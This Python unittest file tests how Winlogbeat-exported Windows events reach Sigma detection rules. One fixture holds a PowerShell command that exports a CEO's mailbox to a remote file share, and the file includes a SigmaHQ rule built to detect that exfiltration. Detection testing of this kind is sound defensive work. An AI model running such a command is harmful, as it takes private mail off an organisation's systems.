"""Windows events exported through Elastic (Winlogbeat / Elastic Agent) reach their rules.

Winlogbeat writes the event id as winlog.event_id: the underscore never matched
EventID, so a Sysmon or Security event reached its category only by the generic
"command line next to an image" guess, and a PowerShell 4104 script block reached
NO rule -- its text sits in powershell.file.script_block_text (2026-10-20 severity
audit; ps_script holds 2 critical and 55 high SigmaHQ rules). Rule body is SigmaHQ's.
"""
import json
import os
import sys
import unittest

for _p in (os.path.dirname(os.path.abspath(__file__)),
           os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "modules/backend")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import _optional_deps  # noqa: F401,E402
from services.fusion import external_logs as X, sigma_eval as S  # noqa: E402

MAILBOX_EXPORT = S.compile_rule({  # posh_ps_mailboxexport_share.yml (critical)
    "title": "Suspicious PowerShell Mailbox Export to Share - PS", "id": "4a241dea", "level": "critical",
    "logsource": {"product": "windows", "category": "ps_script"},
    "detection": {"selection": {"ScriptBlockText|contains|all": ["New-MailboxExportRequest", " -Mailbox ",
                                                                  " -FilePath \\\\"]},
                  "condition": "selection"}})


def row(doc):
    _fmt, rows, _left = X.read(json.dumps(doc))
    return rows[0]


def winlog(channel, eid, provider, event_data=None, **extra):
    return {"@timestamp": "2026-10-20T10:05:00Z", "event": {"code": str(eid)},
            "winlog": {"channel": channel, "event_id": str(eid), "provider_name": provider,
                       "computer_name": "ws01.corp.local", "event_data": event_data or {}}, **extra}


class Winlogbeat(unittest.TestCase):
    def test_a_powershell_script_block_reaches_its_rules(self):
        doc = winlog("Microsoft-Windows-PowerShell/Operational", 4104, "Microsoft-Windows-PowerShell",
                     powershell={"file": {"script_block_text":
                                          "New-MailboxExportRequest -Mailbox ceo@corp.example -FilePath \\\\10.0.0.9\\c$\\x.pst"}})
        r = row(doc)
        self.assertIn(("windows", "ps_script", "powershell"), S.profiles(S.Event(X.sigma_event(r))))
        self.assertEqual(["Suspicious PowerShell Mailbox Export to Share - PS"],
                         [h["title"] for h in S.evaluate(X.sigma_event(r), [MAILBOX_EXPORT])])

    def test_sysmon_and_security_get_their_own_categories(self):
        sysmon = row(winlog("Microsoft-Windows-Sysmon/Operational", 1, "Microsoft-Windows-Sysmon",
                            {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami"}))
        self.assertIn(("windows", "process_creation", "sysmon"), S.profiles(S.Event(X.sigma_event(sysmon))))
        sec = row(winlog("Security", 4688, "Microsoft-Windows-Security-Auditing",
                         {"NewProcessName": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami"}))
        self.assertIn(("windows", "process_creation", "security"), S.profiles(S.Event(X.sigma_event(sec))))

    def test_the_dns_server_channel_as_windows_spells_it(self):
        dns = row(winlog("Microsoft-Windows-DNSServer/Analytical", 256, "Microsoft-Windows-DNSServer", {"QNAME": "x."}))
        self.assertIn(("windows", None, "dns-server-analytic"), S.profiles(S.Event(X.sigma_event(dns))))


if __name__ == "__main__":
    unittest.main()
